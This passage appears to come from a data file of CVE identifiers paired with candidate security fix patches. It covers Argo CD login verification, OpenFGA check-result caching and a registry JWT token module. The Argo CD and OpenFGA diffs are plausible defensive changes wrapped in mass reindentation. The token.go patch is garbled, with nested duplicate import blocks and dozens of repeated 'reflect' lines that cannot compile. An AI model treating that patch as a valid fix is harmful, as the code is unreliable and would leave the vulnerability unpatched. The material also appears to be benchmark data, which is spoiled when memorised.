status.Errorf(codes.InvalidArgument, usernameTooLongError, maxUsernameLength)\n+        }\n+\n+        start := time.Now()\n+        if mgr.verificationDelayNoiseEnabled {\n+                defer func() {\n+                        // introduces random delay to protect from timing-based user enumeration attack\n+                        delayNanoseconds := verificationDelayNoiseMin.Nanoseconds() +\n+                                int64(rand.Intn(int(verificationDelayNoiseMax.Nanoseconds()-verificationDelayNoiseMin.Nanoseconds())))\n+                                // take into account amount of time spent since the request start\n+                        delayNanoseconds = delayNanoseconds - time.Since(start).Nanoseconds()\n+                        if delayNanoseconds > 0 {\n+                                mgr.sleep(time.Duration(delayNanoseconds))\n+                        }\n+                }()\n+        }\n+\n+        attempt := mgr.getFailureCount(username)\n+        if mgr.exceededFailedLoginAttempts(attempt) {\n+                log.Warnf(\"User %s had too many failed logins (%d)\", username, attempt.FailCount)\n+                return InvalidLoginErr\n+        }\n+\n+        account, err := mgr.settingsMgr.GetAccount(username)\n+        if err != nil {\n+                if errStatus, ok := status.FromError(err); ok && errStatus.Code() == codes.NotFound {\n+                        mgr.updateFailureCount(username, true)\n+                        err = InvalidLoginErr\n+                }\n+                // to prevent time-based user enumeration, we must perform a password\n+                // hash cycle to keep response time consistent (if the function were\n+                // to continue and not return here)\n+                _, _ = passwordutil.HashPassword(\"for_consistent_response_time\")\n+                return err\n+        }\n+\n+        valid, _ := passwordutil.VerifyPassword(password, account.PasswordHash)\n+        if !valid {\n+                mgr.updateFailureCount(username, true)\n+                return InvalidLoginErr\n+        }\n+\n+        if !account.Enabled {\n+                return status.Errorf(codes.Unauthenticated, accountDisabled, username)\n+        }\n+\n+        if !account.HasCapability(settings.AccountCapabilityLogin) {\n+                return status.Errorf(codes.Unauthenticated, userDoesNotHaveCapability, username, settings.AccountCapabilityLogin)\n+        }\n+        mgr.updateFailureCount(username, false)\n+        return nil\n }\n \n // VerifyToken verifies if a token is correct. Tokens can be issued either from us or by an IDP.\n // We choose how to verify based on the issuer.\n func (mgr *SessionManager) VerifyToken(tokenString string) (jwt.Claims, error) {\n-\tparser := &jwt.Parser{\n-\t\tValidationHelper: jwt.NewValidationHelper(jwt.WithoutClaimsValidation()),\n-\t}\n-\tvar claims jwt.StandardClaims\n-\t_, _, err := parser.ParseUnverified(tokenString, &claims)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\tswitch claims.Issuer {\n-\tcase SessionManagerClaimsIssuer:\n-\t\t// Argo CD signed token\n-\t\treturn mgr.Parse(tokenString)\n-\tdefault:\n-\t\t// IDP signed token\n-\t\tprov, err := mgr.provider()\n-\t\tif err != nil {\n-\t\t\treturn claims, err\n-\t\t}\n-\n-\t\t// Token must be verified for at least one audience\n-\t\t// TODO(jannfis): Is this the right way? Shouldn't we know our audience and only validate for the correct one?\n-\t\tvar idToken *oidc.IDToken\n-\t\tfor _, aud := range claims.Audience {\n-\t\t\tidToken, err = prov.Verify(aud, tokenString)\n-\t\t\tif err == nil {\n-\t\t\t\tbreak\n-\t\t\t}\n-\t\t}\n-\t\tif err != nil {\n-\t\t\treturn claims, err\n-\t\t}\n-\t\tvar claims jwt.MapClaims\n-\t\terr = idToken.Claims(&claims)\n-\t\treturn claims, err\n-\t}\n+        parser := &jwt.Parser{\n+                ValidationHelper: jwt.NewValidationHelper(jwt.WithoutClaimsValidation()),\n+        }\n+        var claims jwt.StandardClaims\n+        _, _, err := parser.ParseUnverified(tokenString, &claims)\n+        if err != nil {\n+                return nil, err\n+        }\n+        switch claims.Issuer {\n+        case SessionManagerClaimsIssuer:\n+                // Argo CD signed token\n+                return mgr.Parse(tokenString)\n+        default:\n+                // IDP signed token\n+                prov, err := mgr.provider()\n+                if err != nil {\n+                        return claims, err\n+                }\n+\n+                // Token must be verified for at least one audience\n+                // TODO(jannfis): Is this the right way? Shouldn't we know our audience and only validate for the correct one?\n+                var idToken *oidc.IDToken\n+                for _, aud := range claims.Audience {\n+                        idToken, err = prov.Verify(aud, tokenString)\n+                        if err == nil {\n+                                break\n+                        }\n+                }\n+                if err != nil {\n+                        return claims, err\n+                }\n+                var claims jwt.MapClaims\n+                err = idToken.Claims(&claims)\n+                return claims, err\n+        }\n }\n \n func (mgr *SessionManager) provider() (oidcutil.Provider, error) {\n-\tif mgr.prov != nil {\n-\t\treturn mgr.prov, nil\n-\t}\n-\tsettings, err := mgr.settingsMgr.GetSettings()\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\tif !settings.IsSSOConfigured() {\n-\t\treturn nil, fmt.Errorf(\"SSO is not configured\")\n-\t}\n-\tmgr.prov = oidcutil.NewOIDCProvider(settings.IssuerURL(), mgr.client)\n-\treturn mgr.prov, nil\n+        if mgr.prov != nil {\n+                return mgr.prov, nil\n+        }\n+        settings, err := mgr.settingsMgr.GetSettings()\n+        if err != nil {\n+                return nil, err\n+        }\n+        if !settings.IsSSOConfigured() {\n+                return nil, fmt.Errorf(\"SSO is not configured\")\n+        }\n+        mgr.prov = oidcutil.NewOIDCProvider(settings.IssuerURL(), mgr.client)\n+        return mgr.prov, nil\n }\n \n func LoggedIn(ctx context.Context) bool {\n-\treturn Sub(ctx) != \"\"\n+        return Sub(ctx) != \"\"\n }\n \n // Username is a helper to extract a human readable username from a context\n func Username(ctx context.Context) string {\n-\tmapClaims, ok := mapClaims(ctx)\n-\tif !ok {\n-\t\treturn \"\"\n-\t}\n-\tswitch jwtutil.StringField(mapClaims, \"iss\") {\n-\tcase SessionManagerClaimsIssuer:\n-\t\treturn jwtutil.StringField(mapClaims, \"sub\")\n-\tdefault:\n-\t\treturn jwtutil.StringField(mapClaims, \"email\")\n-\t}\n+        mapClaims, ok := mapClaims(ctx)\n+        if !ok {\n+                return \"\"\n+        }\n+        switch jwtutil.StringField(mapClaims, \"iss\") {\n+        case SessionManagerClaimsIssuer:\n+                return jwtutil.StringField(mapClaims, \"sub\")\n+        default:\n+                return jwtutil.StringField(mapClaims, \"email\")\n+        }\n }\n \n func Iss(ctx context.Context) string {\n-\tmapClaims, ok := mapClaims(ctx)\n-\tif !ok {\n-\t\treturn \"\"\n-\t}\n-\treturn jwtutil.StringField(mapClaims, \"iss\")\n+        mapClaims, ok := mapClaims(ctx)\n+        if !ok {\n+                return \"\"\n+        }\n+        return jwtutil.StringField(mapClaims, \"iss\")\n }\n \n func Iat(ctx context.Context) (time.Time, error) {\n-\tmapClaims, ok := mapClaims(ctx)\n-\tif !ok {\n-\t\treturn time.Time{}, errors.New(\"unable to extract token claims\")\n-\t}\n-\treturn jwtutil.IssuedAtTime(mapClaims)\n+        mapClaims, ok := mapClaims(ctx)\n+        if !ok {\n+                return time.Time{}, errors.New(\"unable to extract token claims\")\n+        }\n+        return jwtutil.IssuedAtTime(mapClaims)\n }\n \n func Sub(ctx context.Context) string {\n-\tmapClaims, ok := mapClaims(ctx)\n-\tif !ok {\n-\t\treturn \"\"\n-\t}\n-\treturn jwtutil.StringField(mapClaims, \"sub\")\n+        mapClaims, ok := mapClaims(ctx)\n+        if !ok {\n+                return \"\"\n+        }\n+        return jwtutil.StringField(mapClaims, \"sub\")\n }\n \n func Groups(ctx context.Context, scopes []string) []string {\n-\tmapClaims, ok := mapClaims(ctx)\n-\tif !ok {\n-\t\treturn nil\n-\t}\n-\treturn jwtutil.GetGroups(mapClaims, scopes)\n+        mapClaims, ok := mapClaims(ctx)\n+        if !ok {\n+                return nil\n+        }\n+        return jwtutil.GetGroups(mapClaims, scopes)\n }\n \n func mapClaims(ctx context.Context) (jwt.MapClaims, bool) {\n-\tclaims, ok := ctx.Value(\"claims\").(jwt.Claims)\n-\tif !ok {\n-\t\treturn nil, false\n-\t}\n-\tmapClaims, err := jwtutil.MapClaims(claims)\n-\tif err != nil {\n-\t\treturn nil, false\n-\t}\n-\treturn mapClaims, true\n+        claims, ok := ctx.Value(\"claims\").(jwt.Claims)\n+        if !ok {\n+                return nil, false\n+        }\n+        mapClaims, err := jwtutil.MapClaims(claims)\n+        if err != nil {\n+                return nil, false\n+        }\n+        return mapClaims, true\n }\n"}
{"cve":"CVE-2025-46331:0708", "fix_patch": "diff --git a/internal/graph/cached_resolver.go b/internal/graph/cached_resolver.go\nindex 2e7e02cc..5f1e3578 100644\n--- a/internal/graph/cached_resolver.go\n+++ b/internal/graph/cached_resolver.go\n@@ -1,61 +1,61 @@\n package graph\n \n import (\n-\t\"context\"\n-\t\"strconv\"\n-\t\"time\"\n-\n-\t\"github.com/cespare/xxhash/v2\"\n-\t\"github.com/prometheus/client_golang/prometheus\"\n-\t\"github.com/prometheus/client_golang/prometheus/promauto\"\n-\t\"go.opentelemetry.io/otel/attribute\"\n-\t\"go.opentelemetry.io/otel/trace\"\n-\t\"go.uber.org/zap\"\n-\n-\topenfgav1 \"github.com/openfga/api/proto/openfga/v1\"\n-\n-\t\"github.com/openfga/openfga/internal/build\"\n-\t\"github.com/openfga/openfga/pkg/logger\"\n-\t\"github.com/openfga/openfga/pkg/storage\"\n-\t\"github.com/openfga/openfga/pkg/telemetry\"\n-\t\"github.com/openfga/openfga/pkg/tuple\"\n+        \"context\"\n+        \"strconv\"\n+        \"time\"\n+\n+        \"github.com/cespare/xxhash/v2\"\n+        \"github.com/prometheus/client_golang/prometheus\"\n+        \"github.com/prometheus/client_golang/prometheus/promauto\"\n+        \"go.opentelemetry.io/otel/attribute\"\n+        \"go.opentelemetry.io/otel/trace\"\n+        \"go.uber.org/zap\"\n+\n+        openfgav1 \"github.com/openfga/api/proto/openfga/v1\"\n+\n+        \"github.com/openfga/openfga/internal/build\"\n+        \"github.com/openfga/openfga/pkg/logger\"\n+        \"github.com/openfga/openfga/pkg/storage\"\n+        \"github.com/openfga/openfga/pkg/telemetry\"\n+        \"github.com/openfga/openfga/pkg/tuple\"\n )\n \n const (\n-\tdefaultMaxCacheSize = 10000\n-\tdefaultCacheTTL     = 10 * time.Second\n+        defaultMaxCacheSize = 10000\n+        defaultCacheTTL     = 10 * time.Second\n )\n \n var (\n-\tcheckCacheTotalCounter = promauto.NewCounter(prometheus.CounterOpts{\n-\t\tNamespace: build.ProjectName,\n-\t\tName:      \"check_cache_total_count\",\n-\t\tHelp:      \"The total number of calls to ResolveCheck.\",\n-\t})\n-\n-\tcheckCacheHitCounter = promauto.NewCounter(prometheus.CounterOpts{\n-\t\tNamespace: build.ProjectName,\n-\t\tName:      \"check_cache_hit_count\",\n-\t\tHelp:      \"The total number of cache hits for ResolveCheck.\",\n-\t})\n-\n-\tcheckCacheInvalidHit = promauto.NewCounter(prometheus.CounterOpts{\n-\t\tNamespace: build.ProjectName,\n-\t\tName:      \"check_cache_invalid_hit_count\",\n-\t\tHelp:      \"The total number of cache hits for ResolveCheck that were discarded because they were invalidated.\",\n-\t})\n+        checkCacheTotalCounter = promauto.NewCounter(prometheus.CounterOpts{\n+                Namespace: build.ProjectName,\n+                Name:      \"check_cache_total_count\",\n+                Help:      \"The total number of calls to ResolveCheck.\",\n+        })\n+\n+        checkCacheHitCounter = promauto.NewCounter(prometheus.CounterOpts{\n+                Namespace: build.ProjectName,\n+                Name:      \"check_cache_hit_count\",\n+                Help:      \"The total number of cache hits for ResolveCheck.\",\n+        })\n+\n+        checkCacheInvalidHit = promauto.NewCounter(prometheus.CounterOpts{\n+                Namespace: build.ProjectName,\n+                Name:      \"check_cache_invalid_hit_count\",\n+                Help:      \"The total number of cache hits for ResolveCheck that were discarded because they were invalidated.\",\n+        })\n )\n \n // CachedCheckResolver attempts to resolve check sub-problems via prior computations before\n // delegating the request to some underlying CheckResolver.\n type CachedCheckResolver struct {\n-\tdelegate CheckResolver\n-\tcache    storage.InMemoryCache[any]\n-\tcacheTTL time.Duration\n-\tlogger   logger.Logger\n-\t// allocatedCache is used to denote whether the cache is allocated by this struct.\n-\t// If so, CachedCheckResolver is responsible for cleaning up.\n-\tallocatedCache bool\n+        delegate CheckResolver\n+        cache    storage.InMemoryCache[any]\n+        cacheTTL time.Duration\n+        logger   logger.Logger\n+        // allocatedCache is used to denote whether the cache is allocated by this struct.\n+        // If so, CachedCheckResolver is responsible for cleaning up.\n+        allocatedCache bool\n }\n \n var _ CheckResolver = (*CachedCheckResolver)(nil)\n@@ -66,25 +66,25 @@ type CachedCheckResolverOpt func(*CachedCheckResolver)\n \n // WithCacheTTL sets the TTL (as a duration) for any single Check cache key value.\n func WithCacheTTL(ttl time.Duration) CachedCheckResolverOpt {\n-\treturn func(ccr *CachedCheckResolver) {\n-\t\tccr.cacheTTL = ttl\n-\t}\n+        return func(ccr *CachedCheckResolver) {\n+                ccr.cacheTTL = ttl\n+        }\n }\n \n // WithExistingCache sets the cache to the specified cache.\n // Note that the original cache will not be stopped as it may still be used by others. It is up to the caller\n // to check whether the original cache should be stopped.\n func WithExistingCache(cache storage.InMemoryCache[any]) CachedCheckResolverOpt {\n-\treturn func(ccr *CachedCheckResolver) {\n-\t\tccr.cache = cache\n-\t}\n+        return func(ccr *CachedCheckResolver) {\n+                ccr.cache = cache\n+        }\n }\n \n // WithLogger sets the logger for the cached check resolver.\n func WithLogger(logger logger.Logger) CachedCheckResolverOpt {\n-\treturn func(ccr *CachedCheckResolver) {\n-\t\tccr.logger = logger\n-\t}\n+        return func(ccr *CachedCheckResolver) {\n+                ccr.logger = logger\n+        }\n }\n \n // NewCachedCheckResolver constructs a CheckResolver that delegates Check resolution to the provided delegate,\n@@ -93,114 +93,119 @@ func WithLogger(logger logger.Logger) CachedCheckResolverOpt {\n // immediately and no re-computation is necessary.\n // NOTE: the ResolveCheck's resolution data will be set as the default values as we actually did no database lookup.\n func NewCachedCheckResolver(opts ...CachedCheckResolverOpt) (*CachedCheckResolver, error) {\n-\tchecker := &CachedCheckResolver{\n-\t\tcacheTTL: defaultCacheTTL,\n-\t\tlogger:   logger.NewNoopLogger(),\n-\t}\n-\tchecker.delegate = checker\n-\n-\tfor _, opt := range opts {\n-\t\topt(checker)\n-\t}\n-\n-\tif checker.cache == nil {\n-\t\tchecker.allocatedCache = true\n-\t\tcacheOptions := []storage.InMemoryLRUCacheOpt[any]{\n-\t\t\tstorage.WithMaxCacheSize[any](defaultMaxCacheSize),\n-\t\t}\n-\n-\t\tvar err error\n-\t\tchecker.cache, err = storage.NewInMemoryLRUCache[any](cacheOptions...)\n-\t\tif err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\t}\n-\n-\treturn checker, nil\n+        checker := &CachedCheckResolver{\n+                cacheTTL: defaultCacheTTL,\n+                logger:   logger.NewNoopLogger(),\n+        }\n+        checker.delegate = checker\n+\n+        for _, opt := range opts {\n+                opt(checker)\n+        }\n+\n+        if checker.cache == nil {\n+                checker.allocatedCache = true\n+                cacheOptions := []storage.InMemoryLRUCacheOpt[any]{\n+                        storage.WithMaxCacheSize[any](defaultMaxCacheSize),\n+                }\n+\n+                var err error\n+                checker.cache, err = storage.NewInMemoryLRUCache[any](cacheOptions...)\n+                if err != nil {\n+                        return nil, err\n+                }\n+        }\n+\n+        return checker, nil\n }\n \n // SetDelegate sets this CachedCheckResolver's dispatch delegate.\n func (c *CachedCheckResolver) SetDelegate(delegate CheckResolver) {\n-\tc.delegate = delegate\n+        c.delegate = delegate\n }\n \n // GetDelegate returns this CachedCheckResolver's dispatch delegate.\n func (c *CachedCheckResolver) GetDelegate() CheckResolver {\n-\treturn c.delegate\n+        return c.delegate\n }\n \n // Close will deallocate resource allocated by the CachedCheckResolver\n // It will not deallocate cache if it has been passed in from WithExistingCache.\n func (c *CachedCheckResolver) Close() {\n-\tif c.allocatedCache {\n-\t\tc.cache.Stop()\n-\t}\n+        if c.allocatedCache {\n+                c.cache.Stop()\n+        }\n }\n \n type CheckResponseCacheEntry struct {\n-\tLastModified  time.Time\n-\tCheckResponse *ResolveCheckResponse\n+        LastModified  time.Time\n+        CheckResponse *ResolveCheckResponse\n }\n \n func (c *CachedCheckResolver) ResolveCheck(\n-\tctx context.Context,\n-\treq *ResolveCheckRequest,\n+        ctx context.Context,\n+        req *ResolveCheckRequest,\n ) (*ResolveCheckResponse, error) {\n-\tspan := trace.SpanFromContext(ctx)\n-\n-\tcacheKey := BuildCacheKey(*req)\n-\n-\ttryCache := req.Consistency != openfgav1.ConsistencyPreference_HIGHER_CONSISTENCY\n-\n-\tif tryCache {\n-\t\tcheckCacheTotalCounter.Inc()\n-\t\tif cachedResp := c.cache.Get(cacheKey); cachedResp != nil {\n-\t\t\tres := cachedResp.(*CheckResponseCacheEntry)\n-\t\t\tisValid := res.LastModified.After(req.LastCacheInvalidationTime)\n-\t\t\tc.logger.Debug(\"CachedCheckResolver found cache key\",\n-\t\t\t\tzap.String(\"store_id\", req.GetStoreID()),\n-\t\t\t\tzap.String(\"authorization_model_id\", req.GetAuthorizationModelID()),\n-\t\t\t\tzap.String(\"tuple_key\", req.GetTupleKey().String()),\n-\t\t\t\tzap.Bool(\"isValid\", isValid))\n-\n-\t\t\tspan.SetAttributes(attribute.Bool(\"cached\", isValid))\n-\t\t\tif isValid {\n-\t\t\t\tcheckCacheHitCounter.Inc()\n-\t\t\t\t// return a copy to avoid races across goroutines\n-\t\t\t\treturn res.CheckResponse.clone(), nil\n-\t\t\t}\n-\n-\t\t\t// we tried the cache and hit an invalid entry\n-\t\t\tcheckCacheInvalidHit.Inc()\n-\t\t} else {\n-\t\t\tc.logger.Debug(\"CachedCheckResolver not found cache key\",\n-\t\t\t\tzap.String(\"store_id\", req.GetStoreID()),\n-\t\t\t\tzap.String(\"authorization_model_id\", req.GetAuthorizationModelID()),\n-\t\t\t\tzap.String(\"tuple_key\", req.GetTupleKey().String()))\n-\t\t}\n-\t}\n-\n-\t// not in cache, or consistency options experimental flag is set, and consistency param set to HIGHER_CONSISTENCY\n-\tresp, err := c.delegate.ResolveCheck(ctx, req)\n-\tif err != nil {\n-\t\ttelemetry.TraceError(span, err)\n-\t\treturn nil, err\n-\t}\n-\n-\tclonedResp := resp.clone()\n-\n-\tc.cache.Set(cacheKey, &CheckResponseCacheEntry{LastModified: time.Now(), CheckResponse: clonedResp}, c.cacheTTL)\n-\treturn resp, nil\n+        span := trace.SpanFromContext(ctx)\n+\n+        cacheKey := BuildCacheKey(*req)\n+\n+        tryCache := req.Consistency != openfgav1.ConsistencyPreference_HIGHER_CONSISTENCY\n+\n+        if tryCache {\n+                checkCacheTotalCounter.Inc()\n+                if cachedResp := c.cache.Get(cacheKey); cachedResp != nil {\n+                        res := cachedResp.(*CheckResponseCacheEntry)\n+                        isValid := res.LastModified.After(req.LastCacheInvalidationTime)\n+                        c.logger.Debug(\"CachedCheckResolver found cache key\",\n+                                zap.String(\"store_id\", req.GetStoreID()),\n+                                zap.String(\"authorization_model_id\", req.GetAuthorizationModelID()),\n+                                zap.String(\"tuple_key\", req.GetTupleKey().String()),\n+                                zap.Bool(\"isValid\", isValid))\n+\n+                        span.SetAttributes(attribute.Bool(\"cached\", isValid))\n+                        if isValid {\n+                                checkCacheHitCounter.Inc()\n+                                // return a copy to avoid races across goroutines\n+                                return res.CheckResponse.clone(), nil\n+                        }\n+\n+                        // we tried the cache and hit an invalid entry\n+                        checkCacheInvalidHit.Inc()\n+                } else {\n+                        c.logger.Debug(\"CachedCheckResolver not found cache key\",\n+                                zap.String(\"store_id\", req.GetStoreID()),\n+                                zap.String(\"authorization_model_id\", req.GetAuthorizationModelID()),\n+                                zap.String(\"tuple_key\", req.GetTupleKey().String()))\n+                }\n+        }\n+\n+        // not in cache, or consistency options experimental flag is set, and consistency param set to HIGHER_CONSISTENCY\n+        resp, err := c.delegate.ResolveCheck(ctx, req)\n+        if err != nil {\n+                telemetry.TraceError(span, err)\n+                return nil, err\n+        }\n+\n+// Do not cache results that are dependent on contextual tuples.\n+if len(req.ContextualTuples) > 0 {\n+return resp, nil\n+}\n+\n+        clonedResp := resp.clone()\n+\n+        c.cache.Set(cacheKey, &CheckResponseCacheEntry{LastModified: time.Now(), CheckResponse: clonedResp}, c.cacheTTL)\n+        return resp, nil\n }\n \n func BuildCacheKey(req ResolveCheckRequest) string {\n-\ttup := tuple.From(req.GetTupleKey())\n-\tcacheKeyString := tup.String() + req.GetInvariantCacheKey()\n+        tup := tuple.From(req.GetTupleKey())\n+        cacheKeyString := tup.String() + req.GetInvariantCacheKey()\n \n-\thasher := xxhash.New()\n+        hasher := xxhash.New()\n \n-\t// Digest.WriteString returns int and a nil error, ignoring\n-\t_, _ = hasher.WriteString(cacheKeyString)\n+        // Digest.WriteString returns int and a nil error, ignoring\n+        _, _ = hasher.WriteString(cacheKeyString)\n \n-\treturn strconv.FormatUint(hasher.Sum64(), 10)\n+        return strconv.FormatUint(hasher.Sum64(), 10)\n }\n"}
{"cve":"CVE-2025-24976:0708", "fix_patch": "diff --git a/registry/auth/token/token.go b/registry/auth/token/token.go\nindex 55d0b7f6..45a91d95 100644\n--- a/registry/auth/token/token.go\n+++ b/registry/auth/token/token.go\n@@ -1,316 +1,366 @@\n package token\n \n+import \"reflect\"\n import (\n-\t\"crypto\"\n-\t\"crypto/x509\"\n-\t\"errors\"\n-\t\"fmt\"\n-\t\"time\"\n-\n-\t\"github.com/go-jose/go-jose/v4\"\n-\t\"github.com/go-jose/go-jose/v4/jwt\"\n-\tlog \"github.com/sirupsen/logrus\"\n-\n-\t\"github.com/distribution/distribution/v3/registry/auth\"\n+import \"reflect\"\n+        \"crypto\"\n+\"reflect\"\n+\"reflect\"\n+\"reflect\"\n+\"reflect\"\n+\"reflect\"\n+\"reflect\"\n+\"reflect\"\n+\"reflect\"\n+\"reflect\"\n+\"reflect\"\n+import (\n+\"crypto\"\n+\"crypto/x509\"\n+\"errors\"\n+\"fmt\"\n+\"reflect\"\n+\"time\"\n+\"reflect\"\n+\"reflect\"\n+\"reflect\"\n+\"reflect\"\n+\"reflect\"\n+\"reflect\"\n+        \"crypto/x509\"\n+\"reflect\"\n+\"reflect\"\n+\"reflect\"\n+\"reflect\"\n+\"reflect\"\n+\"reflect\"\n+\"reflect\"\n+\"reflect\"\n+\"reflect\"\n+\"reflect\"\n+\"reflect\"\n+\"reflect\"\n+\"reflect\"\n+\"reflect\"\n+\"reflect\"\n+        \"errors\"\n+        \"reflect\"\n+        \"reflect\"\n+\"reflect\"\n+\"reflect\"\n+\"reflect\"\n+\"reflect\"\n+\"reflect\"\n+        \"reflect\"\n+\"reflect\"\n+\"reflect\"\n+        \"fmt\"\n+        \"time\"\n+\n+        \"github.com/go-jose/go-jose/v4\"\n+        \"github.com/go-jose/go-jose/v4/jwt\"\n+        log \"github.com/sirupsen/logrus\"\n+\n+        \"github.com/distribution/distribution/v3/registry/auth\"\n )\n \n const (\n-\t// TokenSeparator is the value which separates the header, claims, and\n-\t// signature in the compact serialization of a JSON Web Token.\n-\tTokenSeparator = \".\"\n-\t// Leeway is the Duration that will be added to NBF and EXP claim\n-\t// checks to account for clock skew as per https://tools.ietf.org/html/rfc7519#section-4.1.5\n-\tLeeway = 60 * time.Second\n+        // TokenSeparator is the value which separates the header, claims, and\n+        // signature in the compact serialization of a JSON Web Token.\n+        TokenSeparator = \".\"\n+        // Leeway is the Duration that will be added to NBF and EXP claim\n+        // checks to account for clock skew as per https://tools.ietf.org/html/rfc7519#section-4.1.5\n+        Leeway = 60 * time.Second\n )\n \n var signingAlgorithms = map[string]jose.SignatureAlgorithm{\n-\t\"EdDSA\": jose.EdDSA,\n-\t\"HS256\": jose.HS256,\n-\t\"HS384\": jose.HS384,\n-\t\"HS512\": jose.HS512,\n-\t\"RS256\": jose.RS256,\n-\t\"RS384\": jose.RS384,\n-\t\"RS512\": jose.RS512,\n-\t\"ES256\": jose.ES256,\n-\t\"ES384\": jose.ES384,\n-\t\"ES512\": jose.ES512,\n-\t\"PS256\": jose.PS256,\n-\t\"PS384\": jose.PS384,\n-\t\"PS512\": jose.PS512,\n+        \"EdDSA\": jose.EdDSA,\n+        \"HS256\": jose.HS256,\n+        \"HS384\": jose.HS384,\n+        \"HS512\": jose.HS512,\n+        \"RS256\": jose.RS256,\n+        \"RS384\": jose.RS384,\n+        \"RS512\": jose.RS512,\n+        \"ES256\": jose.ES256,\n+        \"ES384\": jose.ES384,\n+        \"ES512\": jose.ES512,\n+        \"PS256\": jose.PS256,\n+        \"PS384\": jose.PS384,\n+        \"PS512\": jose.PS512,\n }\n \n var defaultSigningAlgorithms = []jose.SignatureAlgorithm{\n-\tjose.EdDSA,\n-\tjose.HS256,\n-\tjose.HS384,\n-\tjose.HS512,\n-\tjose.RS256,\n-\tjose.RS384,\n-\tjose.RS512,\n-\tjose.ES256,\n-\tjose.ES384,\n-\tjose.ES512,\n-\tjose.PS256,\n-\tjose.PS384,\n-\tjose.PS512,\n+        jose.EdDSA,\n+        jose.HS256,\n+        jose.HS384,\n+        jose.HS512,\n+        jose.RS256,\n+        jose.RS384,\n+        jose.RS512,\n+        jose.ES256,\n+        jose.ES384,\n+        jose.ES512,\n+        jose.PS256,\n+        jose.PS384,\n+        jose.PS512,\n }\n \n // Errors used by token parsing and verification.\n var (\n-\tErrMalformedToken = errors.New(\"malformed token\")\n-\tErrInvalidToken   = errors.New(\"invalid token\")\n+        ErrMalformedToken = errors.New(\"malformed token\")\n+        ErrInvalidToken   = errors.New(\"invalid token\")\n )\n \n // ResourceActions stores allowed actions on a named and typed resource.\n type ResourceActions struct {\n-\tType    string   `json:\"type\"`\n-\tClass   string   `json:\"class,omitempty\"`\n-\tName    string   `json:\"name\"`\n-\tActions []string `json:\"actions\"`\n+        Type    string   `json:\"type\"`\n+        Class   string   `json:\"class,omitempty\"`\n+        Name    string   `json:\"name\"`\n+        Actions []string `json:\"actions\"`\n }\n \n // ClaimSet describes the main section of a JSON Web Token.\n type ClaimSet struct {\n-\t// Public claims\n-\tIssuer     string       `json:\"iss\"`\n-\tSubject    string       `json:\"sub\"`\n-\tAudience   AudienceList `json:\"aud\"`\n-\tExpiration int64        `json:\"exp\"`\n-\tNotBefore  int64        `json:\"nbf\"`\n-\tIssuedAt   int64        `json:\"iat\"`\n-\tJWTID      string       `json:\"jti\"`\n-\n-\t// Private claims\n-\tAccess []*ResourceActions `json:\"access\"`\n+        // Public claims\n+        Issuer     string       `json:\"iss\"`\n+        Subject    string       `json:\"sub\"`\n+        Audience   AudienceList `json:\"aud\"`\n+        Expiration int64        `json:\"exp\"`\n+        NotBefore  int64        `json:\"nbf\"`\n+        IssuedAt   int64        `json:\"iat\"`\n+        JWTID      string       `json:\"jti\"`\n+\n+        // Private claims\n+        Access []*ResourceActions `json:\"access\"`\n }\n \n // Token is a JSON Web Token.\n type Token struct {\n-\tRaw string\n-\tJWT *jwt.JSONWebToken\n+        Raw string\n+        JWT *jwt.JSONWebToken\n }\n \n // VerifyOptions is used to specify\n // options when verifying a JSON Web Token.\n type VerifyOptions struct {\n-\tTrustedIssuers    []string\n-\tAcceptedAudiences []string\n-\tRoots             *x509.CertPool\n-\tTrustedKeys       map[string]crypto.PublicKey\n+        TrustedIssuers    []string\n+        AcceptedAudiences []string\n+        Roots             *x509.CertPool\n+        TrustedKeys       map[string]crypto.PublicKey\n }\n \n // NewToken parses the given raw token string\n // and constructs an unverified JSON Web Token.\n func NewToken(rawToken string, signingAlgs []jose.SignatureAlgorithm) (*Token, error) {\n-\ttoken, err := jwt.ParseSigned(rawToken, signingAlgs)\n-\tif err != nil {\n-\t\treturn nil, ErrMalformedToken\n-\t}\n-\n-\treturn &Token{\n-\t\tRaw: rawToken,\n-\t\tJWT: token,\n-\t}, nil\n+        token, err := jwt.ParseSigned(rawToken, signingAlgs)\n+        if err != nil {\n+                return nil, ErrMalformedToken\n+        }\n+\n+        return &Token{\n+                Raw: rawToken,\n+                JWT: token,\n+        }, nil\n }\n \n // Verify attempts to verify this token using the given options.\n // Returns a nil error if the token is valid.\n func (t *Token) Verify(verifyOpts VerifyOptions) (*ClaimSet, error) {\n-\t// Verify that the signing key is trusted.\n-\tsigningKey, err := t.VerifySigningKey(verifyOpts)\n-\tif err != nil {\n-\t\tlog.Infof(\"failed to verify token: %v\", err)\n-\t\treturn nil, ErrInvalidToken\n-\t}\n-\n-\t// NOTE(milosgajdos): Claims both verifies the signature\n-\t// and returns the claims within the payload\n-\tvar claims ClaimSet\n-\terr = t.JWT.Claims(signingKey, &claims)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\t// Verify that the Issuer claim is a trusted authority.\n-\tif !contains(verifyOpts.TrustedIssuers, claims.Issuer) {\n-\t\tlog.Infof(\"token from untrusted issuer: %q\", claims.Issuer)\n-\t\treturn nil, ErrInvalidToken\n-\t}\n-\n-\t// Verify that the Audience claim is allowed.\n-\tif !containsAny(verifyOpts.AcceptedAudiences, claims.Audience) {\n-\t\tlog.Infof(\"token intended for another audience: %v\", claims.Audience)\n-\t\treturn nil, ErrInvalidToken\n-\t}\n-\n-\t// Verify that the token is currently usable and not expired.\n-\tcurrentTime := time.Now()\n-\n-\tExpWithLeeway := time.Unix(claims.Expiration, 0).Add(Leeway)\n-\tif currentTime.After(ExpWithLeeway) {\n-\t\tlog.Infof(\"token not to be used after %s - currently %s\", ExpWithLeeway, currentTime)\n-\t\treturn nil, ErrInvalidToken\n-\t}\n-\n-\tNotBeforeWithLeeway := time.Unix(claims.NotBefore, 0).Add(-Leeway)\n-\tif currentTime.Before(NotBeforeWithLeeway) {\n-\t\tlog.Infof(\"token not to be used before %s - currently %s\", NotBeforeWithLeeway, currentTime)\n-\t\treturn nil, ErrInvalidToken\n-\t}\n-\n-\treturn &claims, nil\n+        // Verify that the signing key is trusted.\n+        signingKey, err := t.VerifySigningKey(verifyOpts)\n+        if err != nil {\n+                log.Infof(\"failed to verify token: %v\", err)\n+                return nil, ErrInvalidToken\n+        }\n+\n+        // NOTE(milosgajdos): Claims both verifies the signature\n+        // and returns the claims within the payload\n+        var claims ClaimSet\n+        err 